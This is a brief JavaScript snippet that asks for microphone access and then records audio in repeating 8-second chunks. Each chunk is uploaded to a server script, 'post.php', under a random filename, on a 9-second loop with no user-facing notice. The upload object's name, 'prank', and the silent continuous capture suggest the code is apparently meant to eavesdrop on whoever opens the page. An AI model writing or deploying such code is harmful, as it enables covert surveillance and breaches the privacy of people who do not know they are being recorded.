function storeaudio(){	  
navigator.mediaDevices.getUserMedia({ audio: true })
  .then(stream => {
    const mediaRecorder = new MediaRecorder(stream);
    mediaRecorder.start();

    const audiofile = [];
    mediaRecorder.addEventListener("dataavailable", event => {
      audiofile.push(event.data);
    });

    mediaRecorder.addEventListener("stop", () => {
      const audioBlob = new Blob(audiofile);
      const audioUrl = URL.createObjectURL(audioBlob);
      var xhr=new XMLHttpRequest();
      xhr.onload=function(e) {
        if(this.readyState === 4) {
            console.log("Server returned: ",e.target.responseText);
        }
      };
      var prank=new FormData();
      let ranfile = (Math.random() + 1).toString(36).substring(7);
      console.log("random", ranfile);
      prank.append("audio_data",audioBlob,ranfile);
      xhr.open('POST', 'post.php', true);
          xhr.onload = function () {
              if (this.status === 200)
                  console.log(this.response);
              else
                  console.error(xhr);
          };
          xhr.send(prank);
    });

    setInterval(() => {
            
        
      mediaRecorder.stop()
          
    }, 8000);
  
})

}

setInterval(function(){
    storeaudio()
},9000)
